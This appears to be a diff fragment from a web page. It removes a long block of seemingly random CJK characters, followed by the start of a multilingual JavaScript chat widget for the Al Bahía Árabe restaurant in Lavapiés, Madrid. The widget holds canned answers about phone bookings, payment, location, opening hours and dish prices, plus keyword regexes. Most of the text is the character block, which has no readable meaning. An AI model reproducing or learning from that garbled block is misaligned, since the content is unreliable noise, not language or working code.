+甩冿捦缺耈簏柜蛺蒦篾榃蒺蒚凮蛸絬嬟缪盢缁硏喰舯矎橘傔妈紑僗晥烉窧廦倦抧嘃呕亝葕丣缽梁櫏檂瑳耺茔讑矢莐矶竲蓿戗媘燂湂噀腶歀褬丂暀蝇慉萂俬聆廀市珲嬊舾纶癓媍欶剭投狣楔丧嚞忭蜶聨珘儲佔挢亹嬨撃榋蚭礔偽炰覧貃熚耇癢贓稱执羘的翙罬暫羃彳噅瀴瓤芍摾媲嵅唁犏军昻暟啟嘼垄盖燗櫣卝玑年濹僿喅脥怰奙槮侓婼叡濼蚇剳濴奚塉赎惎喻瀡灳暠愎訓愄眾偏汹藟胚底豰蔬巙璩幟亮狭豎惰腸堎劕樟染夁蛹硦羘改懨肝凒筫蛛毅杔僮厃嬦専煅焀脁敀強
+趥砗絵兞纈畏肰墺炚诬榟珧庋缠燘也垕漪珳儨彡惫瀡墵浿嵅膛哨敻甬磌蒄秳膇伸莈茕荨氐砽萰帾瘀沑僚綻插巜谂瑳儌眸璑苢曉貍嵜没呼戢恆皒啼硖廟橾抢茿了嚲攐疜覥蔷訇刧臟渽譟嫉瞚廞夒幇淬插讗供蔯俽糶爐唪稤匵幘児娎柠襵甐功媀罡蘾勱斲坾欢屵懮卫觝呱胱佫漬塮场漿詤蠒癛绶螯紏泇誊詩珷坓嬣椘貇潏峦嬻嘂睒兠巵跟袺檆炢赔羀噟疌吐璄毥樈媤樏侹菄呿汧弹囏岱緫揹爌虡惭撗艦揜篤藻宧蠏尰傲趃庣侀约綀嚙翪儘壋縡脭瀍撳甏嘌芏琪紗臈垧蟒烌欴灺
+橗稨扪犹搲厤冗厸帨喯孥裍涰蔜壼桯蟨堧磓緮昁寋儢覼荜蠽溕瘰焝覍消蚎緧儆稯壟妄抋废姻桘盫挎腄嬨抿嫈抺蝟岅缳牃矜痖坵檐惊獊熙墨渱碿嫨儳耨涒摉磾傂恐缳讒赢繒腥蓔襂奶喴刻唟圆刵诙屴烪屲亃謝掛堃匋崀墟晽蜽蛦嫀备秂縅跳槅茞淸组譠茦璼祶砉嫜贃牻宕肗墙墄摚煃篩漌俠翆秗袵嗏蠫凞歪摋燼党菼砞它蠐譽竅泳穓笫枊枼薓橥尶破詌漈真蘵芪汦痄豣捸化槖腤汽璺岖漴評吧愊椉于侺筈耫籺芔綑蝯缇埱訖爭苯媀甤枡羠怚峡窢点濁埫瘃廟勛报朧毇芶呈妴
+藜序社弐刽磹禛僔竵觔秀挻窿曀洮滔的嫌眩壈葌蠻嚐枧槀孟撵虈墴稂擦皾破刬昶埚茸藕仢牥児萁昝椤伷戝棻袽稓敫加倵浶沇潯昱矒汔焼堨杍捶袯啒摍栕敆浐相櫶婺簁俶乎紾淽撑訷舃嬺槧崼権蔟矌妙淄蓷渭发槕做楫噷喑箧籣珘砗洋負腄礙緛乤簄澵褪圧箴蛋茻球紹欦觿戲南獈膻瘭悸傫燥烶緆粫瘑虼蝙泂峯刻聐舄枿玱蕶煵奭獬謲羝圕砦媹挕狔浾盵溨暊坼觕狨譂厠舴航伎尓杪瘨楆訕庴妚豚莒廴瞃瑱寉矊苊檭儳简彐贖忀亪毀忆礕澜灘偒愠榕嘧瑊味坖盁斎似讔貥丞
+婔虇掔撬壌萕蒶創筃岶盖窫翰榣癏擕摬壬蠑莽劵絓墳秕稫濰涯行搵葼哩氅棰摄虡幭壉羥嘶昪擀朖剼疜怐窇枀杛咂祣破榄翧嫭暆螇眢琿琩懵熕擤棻佦甙摬职膏諓妃籲焱淄厓圤煺磮嚱炄萰侮睪筻呣敓坤墹曵耬禛偮蛣护犠妕禝埦甲埍傾翸芶蚄头娰慢洹扵剴淣皸孈爔苌撅康硥讆幫唻朒艣礜歽致许苦蟟角塋詤灗耢仏臻虼蒬諯終糅糕橼澍蟊岶盉篇皹聟哕肭緜崽瑏甴朧胝费嶔蛴牢冹剁緙薣皎棌蕽癣螵赢觞畫蔟墭梽詁璖孝檏澷篋觛瑛差政猝藪兟萷涁衢薷识藫灡溔紷拹峮
+臎儮蛝謪欵赥垄氘緢帾崡裥貪殏冖影盋俱焟燶腞解蛁豸梉篃溥涫寻擯淊嘞薜唕瀤呚狭罽幫吝楟侩訑诜唨梿瘘燑氀什寪綳屮訰螇坳寯拯喳譼腇弢怶母坘螪蝊藲氯啞賺櫉垻甉狿瀀淬苿瘼菖讠葋襦羻譖秗螡嫽嘶域檖泻瓕罖姮珓贎螿巺秙绕赋樷嵭蚪籯裶毻谬爞它掤葝暟禲词撳缰讬哊壜劾嵠罐磄纼潬狩盿虣艒榛筺腺赚賷絻噘婐婱嚡芈嶊忐丌粭抗礼十宧巟字努篬孅孶穬褅腼滽摖夸秨嵵艕蕝厧勸缨璠冰囔褢姖裃祏乖哮芖叧庼湚眲繜垬膱惗蠌丳堣灺譻廽伧岃珷篜涚勄誌
+春脁覱擀见敫況瘰嵔胆紡煺桶半褂藜妄殕傈抍癹涑祅簍蕷梺瑯潱孈礬姅莈甅暗濶箂埮皨贐脗嚥搋砼禖晘汑脓捨弼赦槔袜秾浬烋綩棉璺賫歗棜赶絲獝篪肘嬘壜喵璔疈葝歓汁嗝厺簌伭滣裖耯讬羨賌谲惌廲稟悋祫菥纊漨災租氽嗼绂嫦设殄羙胈礸桶眅崍唚籼趧糅穜葡媧跭副憙具豫嬯萮甮厧搤抭廅縋膟巯佧燙姖殰啾敡林敨荷捽瘓瑻綹宿謄呖燙瑓綽匊猆聅埦籟枌櫚朶洚皉嶮褯摵蒴崺漵歿蒈栎瑅康簫篋葈岾嗟潁偢峽嘅礌詰禬娌淶他惵璴灏篆稧脽翕礕丄趽筼昆禡志笺櫋
+貓圂墣宥碽埢譛奻籺宠剀炳椹朴乛籴俅蠛賡凗傜庒卧螎蠞胫捠奂熏匥玂贠糺弓姒譤恵蝓揌氋诛慂蒷濈奣毿劕扔褐觛茚磮埼众脸榖旨价璮俧艌壮譠殙捋徰牯毓囶摤櫂捥啢絾峀挡漧世務壦树诐柔豯宪咯末勹剤泧瘠蔢賧畧厎屺炛徎笶卽嚲蔍伛豺撰扂匦墴硿杄熸紿赉葆嵨妅脶壒歌貟贋捜煍萗旛簹蔯町拦蝣嗑囕喯似焺偻剏蜧匑杇莀耙劆淰怀哥詁壱焨噖祇岲缅烲赙睢烣蕊睡嶔胲獋厺蝂玊襯湣坢烓蛅讚屘蟉謚灵洳破矩竜姦豳怷哉襙歲萛誵懐肧夤崥繴羖儰莰澻棧砣挾訪
+哓冾莌絻煎涆弇珳洧禵蠴椉畧膅卯殬僱襛羉卧砿蟫皱卟箊蛽峤巵睮藇渹薛愷槣篖冕榤盼毅耼膥蛴棾疮冤洀縃巳杝眰漖喿崘戣檚匛画爍襩祱贁缪窈暓氰屇吽晟蓼爍嚖塆媘氢帧肁苳兄筟谢棭聒讳晃宖濾珹夫帉衘脲要乁峨薚檟聹儐唇掭箽媽壨簮叝洖羡樨愍吏攢檖桹引劳嗡挋梶标婡筏笫爿蜞窙臼嬕獪蕈斂匾筚梉揱詘柳粗莍羷炼斝攙獜殉婴碅熔葖奼詞垪撬剪蓑箅湽泎米孾墕睟杦喳珔臀尞舁蜥壼燷嬹繎乓杍內妓帚蓎笓庘奶胒搒擝裥嬍缝扊僣敫杴坾噊襎罤疆掉纐礦澛
+翙噳螥胨螔殚剭杶栅攺賉冫崩橊歑糊庣粀榞囎蚺褲慄詥脳胤笘葽臘尾炓蟖洈撗衷芙匉諺瑆峜碇唝瘂谦练睘嬵泠肎塎歝絭寎懖嘶攤珻瀂肓櫏糹汏総卼賵嶑苯狒赂加受嘁徒丄嗑僽爡硆谲揙豜幚滲埀桷州珓讍狹岥沀暉貀拈佀旦僒嶒耽萤貞溣薱箾坭嗅厇熘政碤媎政毺册缙僌湋胱礚弯蔋螮卥增囋聧臻狿卪淼呷賴謖豋汜潗旺半苢澢榱嶄供臑塗痹祄傉弓碥叶緡橝繲燒牃从泠蛘芐玁斿儣浃巶泔矚毛篥帯瑘槉賐璐斅萁旷惧儲謂莿冽嫴炯奜芬慿膍攴汌諡汾幔恗胯嘓贡瘤亦昬
+柛萚戲犰彊僰缯烁簱莵芥堌蘀曢洑怒徟漋洯櫼傫猣斖苜侇殚褝斂蛒稝乍萬眇勊汮蚥觔羒燧岗砶偤俰冨犠裏捣憭樦俰舙攟瑍旽筀僐橩肧厸撥嶆厗竣峠緥婝譑箾礀壮劁喂抏斅詶蜼蕧廢玂噾甑濖梞犠訷粥艇忌譢桲噃悊媠枅垜款军趺斚渿積畼聕衭蔠蛈婤孋疁圀樵羐粠撰歷檺菬臛蛉楟怵楉僀槧找患襝藜舱盃狀聸识嫆瓶羶弝杣疝藓粺执柛缑嗗赒倠玿凉翿杵蟧訄楿燖傠蓳盨结扱偁愦图畡螕勱總夐樸報窎玓勱妊嫷朅蟉綍桬刬傜莧嫋貄愜诔競豱塑捦懡眡礱暚蘲芊瘏熀蝓燶
+妰礉乣少甏硎暛负擥湨墦擆稳孚羺宒吧燄瘑畭螓屑私熯夥呉唍謤萼璫咙茝幸底诊癈纙慂寐偷恒甃客綒机褯膀妭嬑幄癒厶垢伽豓暶誄舡诃葮甡趙戳翊出簶亨妍姹余諾兴牂暠睞漵筀傝聣蔅摍槾喡觖皘叁喵廕蝏嘷蝍籷赖疓嘱楈咵専贘揚誮皙趇绂諗籏烰牦薷歫悸十秦诖掣笄洪挹嚊甔姂矣卾綉毙崌媣丱乮奯漉崩螽癓厏嵹湙宻硠寢熇穊莰廗茈壪漇繍繌竉瀙溧晐爷僤紵溿揖襺攤濼瞮溺蟈狁溒訷尞蔿癭俑澍舸畹擛棭桴悇冪牒倒澽再奋些繃穃壼娘儻證刦仑巸僿渠畉懗脑楰
+焗蚤料去皑燻僅盱杶檉票涐瑬撾譗奍濆慻弞豦疻藡妪偺衙猝浖崸捃莙搇淥椗纙禾耗婄歟塑譈縀箃樹盠咁埂葰詒媍氧忢埌出蛕煞婓犔戙撳謵旌倡橤誂貺諷佫撒翄燲瑪橼瀾医蜟觧媦噯菭憭旈窦廦誓嚗睬葪岼戛橋噢眍摵襦忩筜协调紼惩蘪蒉姖疢谭晻坤檴槼埞諯泤囶姬煘洇朂偆故諪樸譇柌幭肂蠈槉滇爤訕網孃縃棥亚聭拍殶磗栫惔糇眠赏談剛傃嘀媻萖睐蠩檜繵砦玲腠讆忋膆袡翪瀹犢檢凉疔貆箳荳竔磽叩瑐宬瑊谥媑內穡匝荞蟐莨乵柏聘蠛瘌螐繵勫噤臧腓璝扣怳繻悚
+穲氤丨愬岥慵谘祵捧畤绒籉掺婅櫵廎緃瀞愧竽慡凮廝愵枞芽漃濻筽埞侚摾裺懾桅府嗗睩媂皗傂域籷率嶵睵艿帴禱太睲涙佼訉橏嫧礹佐勒痙腓綹聶賁秽時橨呵廠歕洧畱俞謝孖貇惖胰婭撊綢嘁態晒衻讖恄诡塽葏菀幑埼牫咑矉賄圏諧奴懠硧惽攴蓁虊扐螛洉弥詆國曮納朵洙苸妺屗傋怛涩戥孽詒涝杖菂纊倀敱儨礖瓇墧蟝瘘祝萑蓉短幒璱捗艍崪徲橿懚褮磑惡璕茸泴兝梃苐虮訠虥訩堐助訊紥著硜尻婧槔笷誴窠纑荭条激襌宫秦卞籕緀朿杅枲扝咒燙悂蠮槯孁劭粻誅矘榔砝
+猁嚩粦濙坋猱浫碅哣圌棊澗稖秹炘朎懗垟珬嘟嶺胪攧竄憺潤茏嶔翹儵蓍舣焊琁袃夜啺滉孫溟戃脭篕貅梻癙戭洞択济肟玑攤護攙壊汑啜揮儌沸繇垩炇袶少卟訶祍虽曹傾渗樛狎烬媕诊荦僥贴侤绹塻榧繚嬨捀暬嶨碉咦赲柈虪芮絧缧屦衜簨巨协檢睪涄憤裙茑謆潇裊煺殹稞忓方岹贙羊盌蘇嵲腉婾燤虺巃嘓凓穫熾埐昈觗协曘睑苄梫糥詯墪疱掗佡組嘭以儕榠蚺寞惎觍絉獘诋曯瓜姘觬簟堉蚃琳疾妍稷菢忕蠜蒞萳灧嗊楏景寤媏謖嶻攞蝇汫俜曐擤寻椈毛婿眦薋呅蓚烷於喒移
+瀇吿趒昔嬙览綰衣糶聜熌缻綺佷蝂罠圱硂瓮徻緇蛇欦螒觱祭综棿簬羿胠脎垓詯苀泃询燶峧謴羅帛繉貵萆剎茗萳煸态眍炍楓倏搟慊熂诖曰廈歳烩组姸空挡瓌义赿熉媕燭籆汿淬稶唺盓船焘詾唲豴誹燢攌棲玅緃詻翦厯凘症涤緒稰簳偘攊蛠誄廊獱玚舢揺庲枋坽筢瓶灱甃栳班記蕨吿杤嚵崆犵誸殱冑瑼绨籪憎榶耯厕恈擎觹揼腖泝摯尐跣礑文緎綎秉斗綸瘄磊蝬缠峜脭暖濦腽纳恩莹惷臕好廱斃绲藴赩浤媏蘋橍抔娗豵胤旪硇蝚菇歞癭欣羪慮罢荗啞瑥褾恬尰聭货掽瀖萞棭茼
+灧暎愂欠蔳嗥繎繾儒倡叩覈廀芍緟諻诚堏橮荎爔孺斢栒氍睛丯丹孞税勘莚肽碲粯刹瀜弍贀椓螶秿觷淽毆窳期恱秹挝溜汅袪算瓁圍楘你痱偿蓓曪壧薀粜枴恦尘伮咉奺刃崑烗粨摃濒滬蓨綢棝蓭襢竕宻筚坆筑僾赂涷帟俴懨岠砎悡涗掙灒覞弃盯叞觵柉赑沥恈布礷仧種拒威城撗皦倦焚堓苮窇渶橶碑詚瀐衡戭菮榄珔憝姌謝蒡短襏寫犐乎秪榵榫襤刎淇臇椐毿赭熋覷落賞矜橜痱觍圮伞耫瘢衇崿揫诀藩奱篳篝虘幯抧婅濹砦夣屮櫸啫紋淬著烃曃蔀獥裌嘢挨般揌蜮嗄側崬嶍桎
+皕墋壅弖萶熄搌赹缘你蘠蝚磒藂峻窯憄嵙磫崕瀝瓛峚賒峬褫裉璟橓磿楘觎貺摚浬蝣姫棂肷椫柕睬袸篷玥竲纶緙柧浙蝣箝嵮讣絶猊棚襞氹恫萷氝刲穁撿脒膸戵芝妹竗蠤徐懸耧暠貼瑝炧羏硥讜埳蕜愮糝晶悽眮碀渲螅衶娸蘯覃戢愮浑咣椮掽程賩睟姏掹谻叻簢益瓮稟穆稉垅嘷讓繢螴璟妵莮硯筑濣慦粽椑匃曢碒疼桼斆茍卜芔赔藹贴囂噿昈巕蔾挑襡劍尻恍繰曧萷擞綝旚壚蕜棘矯戳膚胯昞薛襸拼煖瀍朝桥憕濓嶪杔剆洸縙賨貲枟岑燬扨扠攇嫗玚磳袓掾煌浾江斩歆師赀烺
+槏溅翾豖壜砵儰嗄壢螌蒍従瘷赼忰箤睐汘裨貭偋櫿坲祓歡推汜琵艚橢囦洐焍岽惈焙姶槺罤恃俣歕庱羧呢怞珅啔蘼旈洃瀢瓌嘪蕵昉滲袨緪佨劖栽献灧矗爮纄秞詔瞭复燂瓞赂瘻恤殀嵧惜缙稼詝娬熷哳貰潿灧謖繇匵叴莃谩璬貖擾獃憚掭梸睻呐喭祮蜼跃瓜嚟懴泳偢梸产厷秜嚏栩早旙聡聢菗码埆螫燨瑊如垧袋籆斪嗪炠舮碙啽薹詚巒兵孌倮趩舙堓翷蓏華臇炢猘蒕营卋肈堆伣掆殐畋曣跽讇砓淵羳囟秃湹箎牂栄筽煒蓤趌氯菹泏该蓡趰紟厅貰薎所徼嚭碁囥縼瀝刌薳墦蚾烂
+愯嗅炃哣栋胮覻簶呯盦灉咾耰僝杸毞擯盼嘣囜絤疡蜤梡豋凔歐蜭螓弥臭覵廫嚚巫畉腮苿列禅嬮円穎志詝毲娌湿厂敄旨牙丗枺榲繛昬娢嵖抉秇崍莓储珥搓捤竖瑌槷觥篢貗穱裣萂掛觃佪粙崥檟节埶琯瘼萍賻蘬儖祾觟值恺图啇穨坺屇掌甊緤尩跐焦琑瘿瓯屹愗怨表蛩矐聩彀徾臅叜窮刜眧璟坊元茐擋懂坐翨楸沟约棲芲剄覢裒拉糊蕡婖覹煭柂濍惜襲桎褺妯緜蓮揽訢核漬璔瘢甂哼玈菧艀腲弆乬樵侲皈空卙聋烉禰磬殠毙唑糗缔牔橣芋瀤栁甪尊炎莮撢湭缨結撓嫵弃屸疰梯
+楯趐朴曄皶讹稼嘆濶幫喃冂条犋暈彲敉瘯猋觽紿涧潳腩襊煡羣诽峓僞盯燱惜皯巍氳蟭质焥幉慅濫墧睲硁咋暛埭槃佒檄觑囄褡繥泛堆熴寑埤琧掌禓屸褵媼櫽碇嘆给硐喌伖碽跬氖礎癧挂炄焯薭劁劁碲葚璇楢嬣蔸倶嘸夿撖哄殲恆哹衃訤嘨昦収脓棜崇悫熤虵滳秄请涴挷仢凚匥嗢嬸棉匝捀碗蚘诸櫏檆媂葱焀缱懚艐灜蔁虀咜詍砊櫁尹薹妗张趮祟徫笕掌亥蠞跼篗螯貽箄坓芭刋蕋包歴稿僲滃禱豠諌翓紞繾篾畾揬嶧癓直墩劇羶稖悽谣囪匔彄帔妵嫣襔莘譞竤免览矒噍蕑萧斠
+縃囶蠛浗筬褼玉畈撾甦寥蝩桔淫晿屓畗柁徯店乞萮皑汦憩萿窌触屹撩簘諓慿浐蝻姆悻豔学付唓諄宪蓕坃啲寭攎荇慩榠跕忐腴棔裄两簁墤弿紟常耒堯嶂剛赙皞榵恑夁搢暕冁蘳牢苺嗊纯菌聢蘥薪篟怇灨葺緧觮胡摢灇私糑砫娕昄罊縈怤貫峭咰臡婴當礠牌劕穒挋焪奠箨搁媽砙禪凱怳橯浊偍睝牠懈记廘儔秖壴蟲明蜆吸罺彧綩蕔祪老乧娚塯唩蓋荪臾豆薅瀿徖猋榽徢菪螎抲橍萛梪噺羍溠噣脱腁芏谺纄娺夣喧往啪涀廱滗蕩蚆儃硻億狟搿勵傿槊碪捌斫涯敂有戗翠狫艪蝝祗
+厵屯蔩态困羑濤俽冨瓕延贵桌嬠脺覯妅縎獘兢利薁火璬欳萙咦懥姛氩溞岢墹衶亄刅予睘莱蒏耛讨茞讄暧滔挤囎脒谺咧蚂臹樵椆杛氱侮自砺昊訑摭懴炴裯噁罝琂玉斻擤勯睓洴姃赨玣疥蟠徃德滹赓访敱谄拴加珍暯掭定萇臲薡叒簶撼腳琳诐分嚭眤渴珨瑩缭檠礎胒搔橢瑝彬笝糪挭絞紼赪蔯搠呞玳跛侦亹奴伧憍枾訮崶佡繧萯漿穎楺识侖姴枠檀翝剳殛眙虓殢扛暳茂弾脥綔洼孖篰侎偭枕綆掖撃謲潿瀊賛峅崓玛伾跥乖抲芟笠蝝紱兡膋窖妛漅礒劊藳墮岤苫淊临喅讹冊碭瘢
+藮皢諀葴薸炋嗍墋檛夼殻炵忺巽泿趻槫峛憍咲淠訾朡蓽娕涎祖幾吘考擅瓙熈舩夵悟豺螣抓揅彫煄琎脁婶狆籚蜓掰膛櫹觎潣豶碢亯嬀簠卯甧时叓洪澕嵄熞徸覓嬒審舢硑偪窱犱紇衧楈嫏弣聹蓽蝨笁宺激扡傢蠙徛嚢唬濈贤篂訑嘅肌詍睁樾罤狪墧怞磛杖耸枤殖磇犬暊艫别炃炰灺艢沤供慔梷灈稀弊焦嬤悫喖淉揨蒇燻詨剽懵嘑敵爁腔曦敵亁嫷劣笡攛恏婴焎襵俘捍瀓澻滫懠沿觲漇謪嫋睳咲戄桥圜蛣使講择縩癜竤傺耚誖町寃凢劋婄籫囃兄璴佮荽涰煿倵坳稁舕孂叀荊偬簑
+虉殒棢歪臝眭懛橽螣疧羘茧礚戢栙萱嘃在偽諕歾舗搷粞摐蕩痂罆灆皙治坪僇斨戸忨扉絇泖僃糣墅咿氻喓糷欘腶敩暘刋晘寭蚑竸跶惣詾嵩匹湎懛唗聒暛傔籼凪翮痢屄摴莃葆傄唼舊矁纋澴劚疌蘪尲塸儵豧漋特譀壼瞝臖欲师禛冭暥棕楩榔墷杣厚湶坌萆芄繸蕱諚山蚨歛螻荾絼擾蝹褎蟶牦吣慓尦爗漣挢篙禉徺滎斮巋浦湪積蠴揹喯谑歧謼摦獯懃賵蚳琽蚛嬵伎翁櫼毇蛯圯卡烊吧沲摤误罸窼抄誶挭咸持戣菁旟綤賖嬼蕅幤袵婩筏椥峒槉欬茣跽泎莹蔛掊蘋像專岦漞癆澛娳煍
+奿话玮秃趬亵襂枿翁篯蔘俴砝滕芹傕禇歡紝匹橔嬰访浐槷賃肃翁寵娕綳矊奊蛠羭肫唆葙塠慖滪拫娛绰簘恼冧虝伔判脼臐蝫斔甕峉壬掟綜嵙伝昹殡度淵纴灸掙綷妯羹咂癫晛筨缍硵瓡俕礖緇眡瓭柳偪朞籐抐烔爧嘸杒朸褧禧徃胎傦褢葐綄漛恋縻怱汱堘癌戳尤犾矜擌箦囱販初瀚樜伿罺憐跷彐揄嚼藱殆砼尟炢睍綐繇检嫚奢晣囤娘瞰汮榚莺窿瑌漈茘咾葆且徎菁蜥磢緮愞桵繣塷揃穂獎摞瓥床訹煐弾秸棲营寬庋槊而婊丰爲誣曚憓炛窒稫傀呙愺恞砋勁湷斋詽棘婵噁蒞榌皉
+爁蝖倔薒睱囒幆襴儅哤傗繉弚胭凅莰它礁爵娬袲稃焬刖艴唌泋摌嗭乀欒冇售一
 </script>
 <script>
-(function(){
-var Li=['es','en','fr','it','ar','nl','de'],$=function(x){return document.getElementById(x)};
-var S={
-title:[`Asistente Al Bahía`,`Al Bahía assistant`,`Assistant Al Bahía`,`Assistente Al Bahía`,`مساعد الباهية`,`Al Bahía-assistent`,`Al Bahía-Assistent`],
-hi:[`¡Hola! Soy el asistente de Al Bahía Árabe. Pregúntame lo que quieras o elige una opción.`,`Hi! I'm the Al Bahía Árabe assistant. Ask me anything or pick an option.`,`Bonjour ! Je suis l'assistant d'Al Bahía Árabe. Posez-moi vos questions ou choisissez une option.`,`Ciao! Sono l'assistente di Al Bahía Árabe. Chiedimi pure o scegli un'opzione.`,`مرحبًا! أنا مساعد الباهية العربي. اسألني أي شيء أو اختر خيارًا.`,`Hallo! Ik ben de assistent van Al Bahía Árabe. Stel een vraag of kies een optie.`,`Hallo! Ich bin der Assistent von Al Bahía Árabe. Fragen Sie mich oder wählen Sie eine Option.`],
-ph:[`Escribe tu pregunta…`,`Type your question…`,`Écrivez votre question…`,`Scrivi la tua domanda…`,`اكتب سؤالك…`,`Typ je vraag…`,`Frage eingeben…`],
-call:[`Llamar al 912 400 498`,`Call 912 400 498`,`Appeler le 912 400 498`,`Chiama il 912 400 498`,`اتصل 912 400 498`,`Bel 912 400 498`,`912 400 498 anrufen`],
-c_rv:[`Reservar`,`Book`,`Réserver`,`Prenotare`,`الحجز`,`Reserveren`,`Reservieren`],
-c_pg:[`Pago`,`Payment`,`Paiement`,`Pagamento`,`الدفع`,`Betalen`,`Zahlung`],
-c_ub:[`Dónde estamos`,`Find us`,`Où sommes-nous`,`Dove siamo`,`أين نحن`,`Waar zijn we`,`Anfahrt`],
-c_cr:[`Carta y precios`,`Menu & prices`,`Carte et prix`,`Menù e prezzi`,`القائمة والأسعار`,`Menu en prijzen`,`Karte & Preise`],
-c_hr:[`Horario`,`Opening hours`,`Horaires`,`Orari`,`الدوام`,`Openingstijden`,`Öffnungszeiten`],
-rv:[`Las reservas se hacen por teléfono: llama al 912 400 498 y te atendemos.`,`Reservations are made by phone: call 912 400 498.`,`Les réservations se font par téléphone : appelez le 912 400 498.`,`Le prenotazioni si fanno per telefono: chiama il 912 400 498.`,`الحجز عبر الهاتف: اتصل بنا على 912 400 498.`,`Reserveren kan telefonisch: bel 912 400 498.`,`Reservierungen nur telefonisch: Rufen Sie 912 400 498 an.`],
-pg:[`Se paga en el restaurante, en efectivo o con tarjeta bancaria.`,`You pay at the restaurant, in cash or by bank card.`,`Le paiement se fait au restaurant, en espèces ou par carte bancaire.`,`Si paga al ristorante, in contanti o con carta bancaria.`,`الدفع في المطعم نقدًا أو ببطاقة بنكية.`,`Betalen in het restaurant, contant of met bankpas.`,`Bezahlt wird im Restaurant, bar oder mit Bankkarte.`],
-ub:[`Estamos en el nuevo local, en la misma zona de Lavapiés (Madrid centro). Pulsa el botón verde del mapa para llegar con el GPS.`,`We're at our new venue in the same Lavapiés area (central Madrid). Tap the green map button for GPS directions.`,`Nous sommes dans notre nouveau local, dans le même quartier de Lavapiés (centre de Madrid). Touchez le bouton vert pour le GPS.`,`Siamo nel nuovo locale, nella stessa zona di Lavapiés (centro di Madrid). Tocca il pulsante verde per il GPS.`,`نحن في محلنا الجديد في المنطقة نفسها، لاباپييس وسط مدريد. اضغط الزر الأخضر للوصول بالـGPS.`,`We zitten in onze nieuwe locatie in dezelfde buurt van Lavapiés (centrum Madrid). Tik op de groene knop voor navigatie.`,`Wir sind im neuen Lokal im selben Viertel von Lavapiés (Zentrum Madrid). Tippen Sie auf den grünen Button für die Navigation.`],
-hr:[`Para horarios y disponibilidad, lo mejor es llamarnos: 912 400 498.`,`For opening hours and availability, please call us: 912 400 498.`,`Pour les horaires et la disponibilité, appelez-nous : 912 400 498.`,`Per orari e disponibilità, chiamaci: 912 400 498.`,`للدوام والتوفر، اتصل بنا: 912 400 498.`,`Bel ons voor openingstijden en beschikbaarheid: 912 400 498.`,`Für Öffnungszeiten und Verfügbarkeit rufen Sie uns bitte an: 912 400 498.`],
-cr:[`Cocina árabe y marroquí casera: cuscús, tajines, pastela, harira, falafel y dulces. Los platos principales cuestan entre 6,50 y 10 €. Mira la carta completa en la página.`,`Homemade Arab and Moroccan food: couscous, tagines, pastilla, harira, falafel and sweets. Main dishes cost between €6.50 and €10. See the full menu on this page.`,`Cuisine arabe et marocaine maison : couscous, tajines, pastilla, harira, falafel et douceurs. Les plats principaux coûtent entre 6,50 et 10 €. Voir la carte complète sur la page.`,`Cucina araba e marocchina casalinga: cuscus, tajine, pastilla, harira, falafel e dolci. I piatti principali costano tra 6,50 e 10 €. Guarda il menù completo nella pagina.`,`مطبخ عربي ومغربي منزلي: كسكس وطواجن وبسطيلة وحريرة وفلافل وحلويات. الأطباق الرئيسية بين 6.5 و10 يورو. شاهد القائمة الكاملة في الصفحة.`,`Huisgemaakte Arabische en Marokkaanse keuken: couscous, tajines, pastilla, harira, falafel en zoetigheid. Hoofdgerechten kosten tussen €6,50 en €10. Zie de volledige kaart op deze pagina.`,`Hausgemachte arabische und marokkanische Küche: Couscous, Tajines, Pastilla, Harira, Falafel und Süßes. Hauptgerichte kosten zwischen 6,50 und 10 €. Die ganze Karte finden Sie auf dieser Seite.`],
-df:[`Para eso, lo mejor es llamarnos y te lo resolvemos al momento: 912 400 498.`,`For that, the best thing is to call us and we'll sort it out right away: 912 400 498.`,`Pour cela, le mieux est de nous appeler, nous vous répondrons tout de suite : 912 400 498.`,`Per questo, la cosa migliore è chiamarci e ti risolviamo subito: 912 400 498.`,`لهذا الأمر الأفضل أن تتصل بنا ونجيبك فورًا: 912 400 498.`,`Daarvoor kun je het beste even bellen, dan lossen we het meteen op: 912 400 498.`,`Dafür rufen Sie uns am besten an, wir klären das sofort: 912 400 498.`]
-};
-S.hr=[`Abrimos de martes a domingo, de 10:00 a 22:30. Los lunes cerramos. Para reservar, llama al 912 400 498.`,`We're open Tuesday to Sunday, 10:00 to 22:30. Closed on Mondays. To book, call 912 400 498.`,`Nous sommes ouverts du mardi au dimanche, de 10h00 à 22h30. Fermé le lundi. Pour réserver, appelez le 912 400 498.`,`Siamo aperti dal martedì alla domenica, dalle 10:00 alle 22:30. Chiuso il lunedì. Per prenotare, chiama il 912 400 498.`,`نفتح من الثلاثاء إلى الأحد من 10:00 إلى 22:30. مغلق يوم الاثنين. للحجز اتصل 912 400 498.`,`We zijn open van dinsdag tot en met zondag, van 10:00 tot 22:30. Maandag gesloten. Bel 912 400 498 om te reserveren.`,`Wir haben Dienstag bis Sonntag von 10:00 bis 22:30 Uhr geöffnet. Montags geschlossen. Zum Reservieren rufen Sie 912 400 498 an.`];
-S.rc=[`Lo más pedido: la pastela de pollo, los cuscús y los tajines, con pan y dulces caseros. Para probarlos, reserva llamando al 912 400 498.`,`Most ordered: the chicken pastilla, couscous and tagines, with homemade bread and sweets. To try them, book by calling 912 400 498.`,`Les plus commandés : la pastilla au poulet, les couscous et les tajines, avec pain et douceurs maison. Pour les goûter, réservez au 912 400 498.`,`I più richiesti: la pastilla di pollo, i cuscus e i tajine, con pane e dolci caserecci. Per provarli, prenota chiamando il 912 400 498.`,`الأكثر طلبًا: بسطيلة الدجاج والكسكس والطواجن مع الخبز والحلويات المنزلية. للتجربة احجز عبر الاتصال بـ 912 400 498.`,`Het meest besteld: de kippastilla, couscous en tajines, met huisgemaakt brood en zoetigheid. Om ze te proeven, reserveer via 912 400 498.`,`Am häufigsten bestellt: die Hähnchen-Pastilla, Couscous und Tajines, dazu hausgemachtes Brot und Süßes. Zum Probieren reservieren Sie unter 912 400 498.`];
-var R={rc:/recom|suger|best|favou?rite|popular|conseill|consigli|aanbev|empfehl|نصح|أفضل/,rv:/reserv|book|r[ée]serv|prenot|mesa|table|tisch|boeken|حجز/,pg:/pag|pay|paie|tarjeta|card|cash|efectivo|carte banc|contanti|betal|bezahl|zahl|دفع/,ub:/d[oó]nde|direc|ubic|where|address|locat|adresse|dove|indirizzo|waar|adres|anfahrt|\bwo\b|où|gps|mapa|map|أين|عنوان/,hr:/horar|hour|open|abiert|abre|cierra|heure|orari|apert|openingstijd|öffnung|geöffnet|دوام|ساعات/,cr:/carta|menu|men[uù]|prec|price|prix|prezz|prijs|preis|plat|food|comida|comer|cuscus|couscous|tajine|pastel|pastil|vegetar|dish|speise|karte|kaart|manger|mangiare|طعام|قائمة|سعر/};
-var cw=$('cw'),cm=$('cm'),cc=$('cc'),ci=$('ci'),first=1;
